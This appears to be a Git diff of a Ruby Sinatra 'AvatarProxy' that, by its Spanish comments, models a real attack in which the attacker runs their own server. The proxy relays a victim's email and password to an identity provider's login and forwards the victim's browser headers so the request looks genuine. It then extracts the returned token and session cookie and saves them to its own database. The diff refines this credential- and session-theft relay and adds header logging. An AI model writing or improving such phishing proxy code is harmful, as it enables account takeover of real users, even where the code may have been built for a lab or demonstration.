@@ -9,6 +9,7 @@ require 'sequel'
 require 'sqlite3'
 require 'dotenv/load'
 require 'uri'
+require 'net/http'
 
 # DB propia del proxy — separada del IdP
 # En el ataque real el atacante tiene su propio servidor
@@ -58,27 +59,36 @@ class AvatarProxy < Sinatra::Base
 
     puts "Proxy: Received login attempt for #{email}"
 
-    idp_response = Faraday.new do |f|
-      f.options[:follow_redirects] = false
-    end.post("#{IDP_URL}/login") do |req|
-      req.headers['Content-Type'] = 'application/x-www-form-urlencoded'
-      req.body = URI.encode_www_form({
-        email:    email,
-        password: password
-      })
-    end
+    # Hacemos el POST directamente con Net::HTTP para no seguir redirects
+    uri = URI("#{IDP_URL}/login")
+    req = Net::HTTP::Post.new(uri)
+    req['Content-Type'] = 'application/x-www-form-urlencoded'
+    # Reenviar headers del navegador para que la petición al IdP sea lo más similar posible
+    req['User-Agent'] = request.user_agent if request.user_agent
+    req['Accept'] = request.env['HTTP_ACCEPT'] if request.env['HTTP_ACCEPT']
+    req['Accept-Language'] = request.env['HTTP_ACCEPT_LANGUAGE'] if request.env['HTTP_ACCEPT_LANGUAGE']
+    req['Origin'] = request.env['HTTP_ORIGIN'] if request.env['HTTP_ORIGIN']
+    req['Referer'] = request.env['HTTP_REFERER'] if request.env['HTTP_REFERER']
+    req['Connection'] = request.env['HTTP_CONNECTION'] if request.env['HTTP_CONNECTION']
 
-    puts "Proxy: IDP response status: #{idp_response.status}"
-    puts "Proxy: IDP response location: #{idp_response.headers['location']}"
+    req.body = URI.encode_www_form({
+      email:    email,
+      password: password
+    })
 
-    if idp_response.status == 302
-      location       = idp_response.headers['location']
-      token          = location.match(/token=(.+)/)[1] rescue nil
-      raw_cookie     = idp_response.headers['set-cookie']
-      session_cookie = raw_cookie.split(';').first rescue nil
+    http = Net::HTTP.new(uri.host, uri.port)
+    http.use_ssl = (uri.scheme == 'https')
+    idp_response = http.request(req)
 
-      puts "Proxy: Extracted token: #{token}"
-      puts "Proxy: Extracted session_cookie: #{session_cookie}"
+    # Log de depuración: mostrar headers entrantes y respuesta del IdP
+    puts "[proxy] Incoming request headers: #{request.env.select { |k,_| k.start_with?('HTTP_') }}"
+
+    if idp_response.code.to_i == 302
+      location       = idp_response['location']
+      token          = location.to_s.match(/token=(.+)/)[1] rescue nil
+      raw_cookie     = idp_response['set-cookie']
+      session_cookie = raw_cookie.to_s.split(';').first rescue nil
+      puts "[proxy] IdP response headers: #{idp_response.to_hash.inspect}"
 
       if token && session_cookie
         # Guarda en la DB propia del proxy
